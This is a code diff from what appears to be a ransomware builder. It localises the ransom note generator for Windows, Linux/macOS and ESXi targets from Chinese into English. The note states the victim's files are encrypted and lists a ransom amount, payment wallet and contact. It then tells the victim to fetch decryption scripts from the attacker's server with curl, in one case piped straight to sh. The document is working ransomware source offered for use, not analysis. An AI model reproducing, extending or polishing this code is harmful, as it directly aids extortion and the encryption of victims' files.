@@ -415,18 +415,22 @@ def generate():
     # 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh（纯 openssl），
     # Windows 用 jasmin_unlock.ps1（纯 PowerShell 7+，无需编译 exe）
     if plat == 'win':
-        dec = ('Windows (需 PowerShell 7+)\n'
+        dec = ('Windows (requires PowerShell 7+)\n'
                f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
-               f'  pwsh -File unlock.ps1 -Server {srv} -K "<解密口令>" -Paths C:\\目标目录')
+               f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>" -Paths C:\\TargetFolder')
     else:
-        dec = ('Linux / macOS（纯 openssl，无需安装任何依赖）\n'
-               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<解密口令>" <目标目录>\n'
-               '  （解密口令与目标目录请向我们索取）')
-    note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
-    if ransom['price']: note += f"\n💰 赎金: {ransom['price']}"
-    if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
-    if ransom['contact']: note += f"\n📧 {ransom['contact']}"
-    note += f"\n\n🔓 解密方法:\n{dec}\n\n✅ SHA-256 校验确保文件100%还原"
+        dec = ('Linux / macOS (pure openssl, no dependencies required)\n'
+               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>" <target_folder>\n'
+               '  (Request the passphrase and target folder from us)')
+    _t = ransom['title']
+    _sub = '' if 'ENCRYPT' in _t.upper() else '║  YOUR FILES HAVE BEEN ENCRYPTED\n'
+    note = (f"╔══════════════════════════════════════════╗\n║  {_t}\n{_sub}"
+            f"╚══════════════════════════════════════════╝\n\nSystem ID: {{sid}}\n\n{ransom['body']}\n")
+    if ransom['price']: note += f"\nRansom Amount: {ransom['price']}"
+    if ransom['wallet']: note += f"\nPayment Address: {ransom['wallet']}"
+    if ransom['contact']: note += f"\nContact: {ransom['contact']}"
+    note += (f"\n\nHow to Decrypt:\n{dec}\n\n"
+             "Sha-256 integrity verification guarantees 100% file restoration.")
     if plat == 'esxi':
         # sh 单引号字符串中用 '\'' 转义
         tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","'\\''"))
